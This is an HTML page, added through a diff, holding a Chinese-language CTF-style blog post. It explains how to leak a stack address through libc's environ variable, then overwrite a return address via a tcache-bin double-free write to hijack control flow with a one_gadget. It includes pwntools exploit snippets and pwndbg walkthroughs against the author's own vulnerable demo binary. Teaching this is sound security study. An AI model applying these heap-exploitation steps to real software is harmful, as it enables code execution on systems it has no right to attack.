@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          基于Environ构造rop链 - C12en
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>C12EN</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="Environ"><a href="#Environ" class="headerlink" title="Environ"></a>Environ</h1><p>Linux C中environ 变量是一个char** 类型 存储着系统的环境变量<br>编译下面的程序 进行一个实验 进入pwndbg我们来看一下environ指向的地址是哪里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">    test1();</span><br><span class="line"></span><br><span class="line">    test2();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303211940250.png" alt="image.png"><br>可以看到其指向的其实是栈帧高地址处的环境变量 我们s进入test1函数<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303211942609.png" alt="image.png"><br>可以看到此时environ存储的值距离rbp非常接近 如果我们计算一下偏移 就可以得到栈帧的ret addr地址<br>再加上任意写 就可以做到控制程序执行流</p>
+<h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><h2 id="覆盖retaddr"><a href="#覆盖retaddr" class="headerlink" title="覆盖retaddr"></a>覆盖retaddr</h2><p>这个办法的利用主要是在堆中 对于开启了沙盒的堆 我们只能构造orw 从而获取flag 但是如何执行rop链是一个难点 如果我们得到了ret addr地址 搭配上任意写 就可以劫持程序执行流 从而执行rop链<br><strong>演示环境: ubuntu22 libc依赖2.27 1.0小版本</strong><br><strong>演示附件: 自己编译的 涵盖所有漏洞</strong><br>首先我们利用tcachebin attack 申请到指向environ的chunk (实际做题当然不局限于tcachebin attack)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">libc_addr = gift()</span><br><span class="line">environ_addr = libc_addr + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(environ_addr))</span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>,)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#-0x110</span></span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
+<p>老生常谈的操作了 不过获取libc基址的那个操作是我编写程序的时候直接给的漏洞 毕竟方便演示嘛<br>那么 获取了栈上的一个地址 要做的当然是计算和ret addr的偏移了<br>这时候会存在两种情况 一种rbp的值指向栈上 下一个字长就是ret addr了 直接看就好了 和泄露出来的偏移大概在0x100-0x200左右 上面的小程序就是这种情况<br>还有一种情况是我的演示程序 其rbp并不指向栈上<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212033587.png" alt="image.png"><br>这种情况也别怕 断点直接打在栈帧结束前的ret指令 看一下现在的rsp是指向哪里 计算那个地址的偏移就行了<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212035615.png" alt="image.png"><br>如图所示 我计算出来的偏移是0x110 那就依法炮制 利用tcachebin attack任意写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(stack_addr))</span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4f2c5</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">8</span>,p64(onegadget_addr))</span><br></pre></td></tr></table></figure>
+<p>直接同样也是图方便 直接填了个onegadget 一般是开沙盒的 或者是libc2.34以上的版本没有hook了<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212038599.png" alt="image.png"><br>可以看到覆盖成功了 接下来就劫持了程序执行流</p>
+<h2 id="覆盖函数的retaddr"><a href="#覆盖函数的retaddr" class="headerlink" title="覆盖函数的retaddr"></a>覆盖函数的retaddr</h2><p>这个我感觉比上面那个效果更牛逼一点 上面那种覆盖办法 直接就把程序执行流控死了 执行完你的rop链以后 如果你rop链不返回的话 就直接终止了程序<br>这个办法是覆盖你调用的函数的retaddr 这样也就把调用函数的执行流控制了 main函数的不会<br>当然 还是没逼用 毕竟最后都控执行流了 我们肯定就获取shell或者flag了 还要这程序执行下去什么<br>哎呀 虽然没用 但还是看一看嘛 了解了解<br>比如 这个时候执行一个puts函数 我们s进入<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212048673.png" alt="image.png"><br>单步执行到这里 继续s进去<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212049066.png" alt="image.png"><br>待这个子函数执行完了 他肯定要返回父函数的嘛<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212049843.png" alt="image.png"><br>这个时候你看rsp指针 是吧 和environ存的地址很接近的<br>算一算偏移照样能覆盖 和上题一样的环境 来演示一下<br>既然我们最后执行的是edit函数 所以攻击的应该是read函数的retaddr<br>不过这里先不演示 就比如menu函数的puts函数吧 打这里<br>断点调一下 算一下偏移 直接打<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212057774.png" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(stack_addr))</span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4f2c5</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x4009CF&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">8</span>,p64(onegadget_addr))</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212058725.png" alt="image.png"><br>欸 怎么不是onegadget呢 犯蠢了吧 那你这都到main函数的执行了 你onegadget是edit函数写进去的 那这栈结构肯定又被系统写了一次 所以我们还是乖乖写read函数吧<br>s进去 单步执行到ret<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212101132.png" alt="image.png"><br>是吧 照样打 算一下偏移 覆盖一下<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212103504.png" alt="image.png"><br>控制程序执行流成功</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="C"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>C12en</div>
+      <div>2023-03-19</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/heap/">heap</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
